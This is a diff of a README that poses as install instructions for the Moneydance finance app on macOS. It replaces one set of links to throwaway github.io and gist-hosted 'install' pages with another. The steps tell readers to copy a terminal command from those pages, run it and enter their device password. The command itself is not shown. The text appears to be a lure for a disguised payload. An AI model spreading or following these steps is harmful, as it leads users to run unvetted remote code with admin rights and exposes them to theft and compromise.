@@ -4,7 +4,7 @@
 Moneydance for Mac is a professional personal finance management software that helps you track your expenses, manage your bank accounts, and organize investments — all in one clean interface 💰.  
 Follow the instructions below to install Moneydance quickly and easily on your macOS device.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?logo=apple&style=for-the-badge)](https://juianaiud84.github.io/.github/moneydance)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button does not work, follow the installation steps below using the terminal command.
 
@@ -25,7 +25,7 @@ If the download button does not work, follow the installation steps below using 
 
 1. Get the installation command by pressing this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-555555?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/sportsmenskyfall/60f8626f4918dacda887384a3e360088/raw/9290198cb820aba533c4be294343d7989842dfea/install.html)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/) 
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.  
